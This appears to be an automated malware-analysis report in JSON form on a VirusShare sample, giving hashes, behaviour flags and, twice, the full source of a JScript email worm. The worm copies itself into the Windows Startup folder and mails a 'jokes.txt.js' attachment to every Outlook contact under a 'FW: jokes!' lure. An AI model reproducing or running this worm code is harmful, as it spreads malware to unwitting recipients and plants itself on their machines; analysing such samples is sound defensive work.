@@ -1,0 +1,69 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "{\n// Mount Onion\n// A retarted JS worm.\nvar fso,shell,src,ReadMe,StartUpWriter,AttachmentWriter,AppOut,mapi,i,y,x;\nshell = WScript.CreateObject(\"WScript.Shell\");\nfso = new ActiveXObject(\"Scripting.FileSystemObject\");\nAppOut= WScript.CreateObject(\"Outlook.Application\");\nmapi=AppOut.GetNamespace(\"MAPI\");\nReadMe=fso.OpenTextFile(WScript.ScriptFullName,1);\nReadMe=Yet.ReadAll();\nReadMe.close();\nStartUpWriter=fso.CreateTextFile(shell.SpecialFolders(\"Startup\")+\"\\\\WinBoot.js\",true);\nStartUpWriter.Write (src);\nStartUpWriter.Close();\nAttachmentWriter=fso.CreateTextFile(fso.getspecialfolder(1))+\"\\\\jokes.txt.js\",true);\nAttachmentWriter.Write (src);\nAttachmentWriter.Close();\ni=0;\nfor(y=1;y<=mapi.AddressLists.Count;y++){\n         for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++){\n                  if (i==15){\n                           mailer.Send\n                           i=0;}\n                  if (i==0){\n                           mailer=outlook.CreateItem(0);\n                           mailer.Subject=\"FW: jokes!\";\n                           mailer.Body = \"These are some good party jokes\";\n                           mailer.Attachments.Add(fso.getspecialfolder(1))+\"\\\\jokes.txt.js\");}\n                  mailer.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));\n                  i++;\n         }\n}\nif (i!=0) mailer.Send\n}"
+    },
+    "filename": "VirusShare_3fa8d63cb1ee3e8855b41bfd4ef71549",
+    "filesize": 1373,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3fa8d63cb1ee3e8855b41bfd4ef71549",
+        "sha1": "a7f245a805e284a8363cf0e0303e75863ed8f28f",
+        "sha256": "bed5ac00ba041d9a866ec04c6ff91e2cccfa90266ae249fbface942fc1da23c1"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "// Mount Onion",
+            "// A retarted JS worm.",
+            "var fso,shell,src,ReadMe,StartUpWriter,AttachmentWriter,AppOut,mapi,i,y,x;",
+            "shell = WScript.CreateObject(\"WScript.Shell\");",
+            "fso = new ActiveXObject(\"Scripting.FileSystemObject\");",
+            "AppOut= WScript.CreateObject(\"Outlook.Application\");",
+            "mapi=AppOut.GetNamespace(\"MAPI\");",
+            "ReadMe=fso.OpenTextFile(WScript.ScriptFullName,1);",
+            "ReadMe=Yet.ReadAll();",
+            "ReadMe.close();",
+            "StartUpWriter=fso.CreateTextFile(shell.SpecialFolders(\"Startup\")+\"\\\\WinBoot.js\",true);",
+            "StartUpWriter.Write (src);",
+            "StartUpWriter.Close();",
+            "AttachmentWriter=fso.CreateTextFile(fso.getspecialfolder(1))+\"\\\\jokes.txt.js\",true);",
+            "AttachmentWriter.Write (src);",
+            "AttachmentWriter.Close();",
+            "i=0;",
+            "for(y=1;y<=mapi.AddressLists.Count;y++){",
+            "         for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++){",
+            "                  if (i==15){",
+            "                           mailer.Send",
+            "                           i=0;}",
+            "                  if (i==0){",
+            "                           mailer=outlook.CreateItem(0);",
+            "                           mailer.Subject=\"FW: jokes!\";",
+            "                           mailer.Body = \"These are some good party jokes\";",
+            "                           mailer.Attachments.Add(fso.getspecialfolder(1))+\"\\\\jokes.txt.js\");}",
+            "                  mailer.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));",
+            "                  i++;",
+            "         }",
+            "if (i!=0) mailer.Send"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.267855",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
